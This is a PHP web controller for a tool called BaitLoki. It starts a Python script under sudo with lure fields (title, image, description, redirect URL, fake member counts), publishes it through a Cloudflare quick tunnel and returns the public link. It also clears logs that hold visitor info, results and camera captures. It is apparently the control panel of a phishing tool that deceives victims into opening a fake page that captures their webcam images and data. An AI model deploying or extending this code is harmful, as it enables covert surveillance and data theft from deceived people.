<?php
// Controlador BaitLoki v6.0 - Renomeado
header('Content-Type: application/json');

if (isset($_POST['action'])) {
    $action = $_POST['action'];

    if ($action === 'start') {
        $templateId = intval($_POST['template']);
        
        $title = escapeshellarg($_POST['title'] ?? '');
        $image = escapeshellarg($_POST['image'] ?? '');
        $desc = escapeshellarg($_POST['desc'] ?? '');
        $redirect = escapeshellarg($_POST['redirect_url'] ?? ''); 
        $mem = escapeshellarg($_POST['mem_num'] ?? '');
        $online = escapeshellarg($_POST['online_num'] ?? '');

        // 1. Limpeza APENAS do Python (BaitLoki.py)
        shell_exec("sudo pkill -f 'python3 BaitLoki.py'"); 
        
        // Limpa logs de texto
        file_put_contents('logs/info.txt', '');
        file_put_contents('logs/result.txt', '');
        
        // Limpeza de fotos antigas
        $old_images = glob('logs/cam_*.png');
        if ($old_images) {
            foreach($old_images as $img) {
                if(is_file($img)) unlink($img);
            }
        }
        
        // 2. Inicia o Python (BaitLoki.py)
        $project_root = escapeshellarg(dirname(__FILE__)); 
        $env_str = "PYTHONPATH=$project_root TITLE=$title IMAGE=$image DESC=$desc REDIRECT_URL=$redirect MEM_NUM=$mem ONLINE_NUM=$online";
        
        // ATENÇÃO: Chamando BaitLoki.py agora
        $cmd_python = "nohup sudo env $env_str python3 BaitLoki.py -t {$templateId} > /dev/null 2>&1 &";
        
        exec($cmd_python);

        // 3. Captura o Link (Polling)
        $publicUrl = null;
        for ($i = 0; $i < 10; $i++) { 
            sleep(1); 
            if (file_exists('logs/cf.log')) {
                $logContent = file_get_contents('logs/cf.log');
                if (preg_match('/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/', $logContent, $matches)) {
                    $publicUrl = $matches[0];
                    break;
                }
            }
        }

        echo json_encode(['status' => 'started', 'public_url' => $publicUrl]);

    } elseif ($action === 'stop') {
        // Mata o processo BaitLoki.py
        shell_exec("sudo pkill -f 'python3 BaitLoki.py'");
        echo json_encode(['status' => 'stopped']);
    }
}
?>